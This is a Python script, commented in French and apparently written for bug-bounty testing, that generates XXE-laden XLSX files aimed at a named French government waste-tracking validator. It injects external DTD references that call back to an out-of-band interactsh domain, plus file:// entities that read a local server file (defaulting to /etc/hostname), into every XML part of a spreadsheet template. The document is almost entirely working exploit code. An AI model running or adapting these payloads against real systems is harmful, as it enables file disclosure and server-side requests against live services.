#!/usr/bin/env python3
"""XLSX de test XXE pour validateur.trackdechets.beta.gouv.fr (à partir du gabarit officiel).

  python3 xxe_xlsx.py --oast <id>.oast.site --template modele.xlsx [--out-dir xxe-out] [--split]

  td-clean.xlsx     témoin : gabarit + marqueurs BBHQn en ligne 2, AUCUNE injection
  td-internal.xlsx  entité INTERNE <!ENTITY a "BBHQINT"> dans les parties qui contiennent les marqueurs
  td-oob.xlsx       DTD externe OOB dans chaque partie XML (sous-domaine = partie parsée)
  td-inband.xlsx    OOB + entité file:// (--read) à la place des marqueurs
  td-oob-<part>     (--split) une seule partie piégée par fichier
"""
import argparse, io, os, re, zipfile
import openpyxl

ap = argparse.ArgumentParser()
ap.add_argument("--oast", required=True, help="domaine interactsh, ex. abcd1234.oast.site")
ap.add_argument("--template", help="gabarit XLSX officiel (FAQ Trackdéchets)")
ap.add_argument("--sheet", type=int, default=0, help="index de l'onglet qui reçoit les marqueurs (0 = établissement)")
ap.add_argument("--headers", default="siret,nom,adresse", help="en-têtes si pas de gabarit")
ap.add_argument("--read", default="/etc/hostname", help="fichier lu en in-band (pas /proc/self/environ : NUL = XML invalide)")
ap.add_argument("--label", default="td", help="préfixe des sous-domaines OAST")
ap.add_argument("--out-dir", default="xxe-out")
ap.add_argument("--split", action="store_true")
a = ap.parse_args()
os.makedirs(a.out_dir, exist_ok=True)

# 1. Classeur de base : gabarit sans lignes d'exemple + marqueurs BBHQn en ligne 2
wb = openpyxl.load_workbook(a.template) if a.template else openpyxl.Workbook()
for sh in wb.worksheets:
    if sh.max_row > 1:
        sh.delete_rows(2, sh.max_row - 1)
ws = wb.worksheets[a.sheet]
if not a.template:
    ws.append(a.headers.split(","))
for c in range(1, max(ws.max_column, 1) + 1):
    ws.cell(row=2, column=c, value=f"BBHQ{c}")
buf = io.BytesIO()
wb.save(buf)

# 2. Lecture unique de toutes les parties (évite de réutiliser les ZipInfo, que writestr modifie)
with zipfile.ZipFile(io.BytesIO(buf.getvalue())) as base:
    files = [(i.filename, i.date_time, base.read(i.filename)) for i in base.infolist()]
parts = [n for n, _, _ in files if n.endswith((".xml", ".rels"))]

def tag_of(name):  # xl/worksheets/sheet1.xml -> xlworksheetssheet1 (label DNS valide)
    return re.sub(r"[^a-z0-9]", "", name.lower().replace(".rels", "r").replace(".xml", ""))[:40]

def inject(txt, name, mode):
    if mode == "internal":
        if "BBHQ" not in txt:
            return txt
        ents = '<!ENTITY a "BBHQINT">'
        txt = re.sub(r">BBHQ\d+<", ">&a;<", txt)
    else:
        ents = f'<!ENTITY % d SYSTEM "http://{a.label}{tag_of(name)}.{a.oast}/d.dtd"> %d;'
        if mode == "inband" and "BBHQ" in txt:
            ents += f'<!ENTITY xxe SYSTEM "file://{a.read}">'
            txt = re.sub(r">BBHQ\d+<", ">&xxe;<", txt)
    decl = ""
    if txt.startswith("<?xml"):
        decl, txt = txt.split("?>", 1)
        decl = decl.replace('standalone="yes"', 'standalone="no"') + "?>"
    root = re.match(r"\s*<([^\s>/]+)", txt).group(1)
    return f"{decl}<!DOCTYPE {root} [{ents}]>{txt}"

def build(out, targets, mode=None):
    with zipfile.ZipFile(os.path.join(a.out_dir, out), "w", zipfile.ZIP_DEFLATED) as z:
        for name, date_time, data in files:
            if mode and name in targets:
                data = inject(data.decode("utf-8"), name, mode).encode("utf-8")
            zi = zipfile.ZipInfo(name, date_time)
            zi.compress_type = zipfile.ZIP_DEFLATED
            z.writestr(zi, data)
    print(f"[+] {out:40} mode={mode or 'aucun'}")

build("td-clean.xlsx", [])
build("td-internal.xlsx", parts, "internal")
build("td-oob.xlsx", parts, "oob")
build("td-inband.xlsx", parts, "inband")
if a.split:
    for p in parts:
        build(f"td-oob-{tag_of(p)}.xlsx", [p], "oob")
print("\nSous-domaines OAST attendus :")
for p in parts:
    print(f"  {a.label}{tag_of(p)}.{a.oast}")